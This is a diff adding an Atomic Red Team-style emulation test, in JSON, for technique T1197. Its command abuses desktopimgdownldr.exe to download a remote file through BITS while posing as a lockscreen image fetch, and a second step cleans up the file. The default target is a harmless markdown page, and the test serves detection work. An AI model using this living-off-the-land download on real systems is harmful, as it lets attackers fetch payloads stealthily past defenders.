@@ -1,0 +1,70 @@
+{
+  "id": "afb5e09e-e385-4dee-9a94-6ee60979d114",
+  "name": "Bits download using desktopimgdownldr.exe (cmd)",
+  "description": "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "0ddbc502-a502-4fc5-a31d-f298d5afad2c",
+      "type": "execute-command",
+      "data": {
+        "command": "set \"#{download_path}\" \u0026\u0026 cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "4eebc14a-bcb0-4b19-be42-ab1f9d7ba875",
+      "type": "execute-command",
+      "data": {
+        "command": "del #{cleanup_path}\\#{cleanup_file} \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "0ddbc502-a502-4fc5-a31d-f298d5afad2c",
+      "p": "on-success",
+      "o": "4eebc14a-bcb0-4b19-be42-ab1f9d7ba875"
+    },
+    {
+      "s": "0ddbc502-a502-4fc5-a31d-f298d5afad2c",
+      "p": "on-failure",
+      "o": "4eebc14a-bcb0-4b19-be42-ab1f9d7ba875"
+    }
+  ],
+  "tags": [
+    "T1197",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_file",
+      "type": "url",
+      "description": "Remote file to download",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"
+    },
+    {
+      "name": "download_path",
+      "type": "path",
+      "description": "Local file path to save downloaded file",
+      "value": "SYSTEMROOT=C:\\Windows\\Temp"
+    },
+    {
+      "name": "cleanup_path",
+      "type": "path",
+      "description": "path to delete file as part of cleanup_command",
+      "value": "C:\\Windows\\Temp\\Personalization\\LockScreenImage"
+    },
+    {
+      "name": "cleanup_file",
+      "type": "string",
+      "description": "file to remove as part of cleanup_command",
+      "value": "*.md"
+    }
+  ]
+}
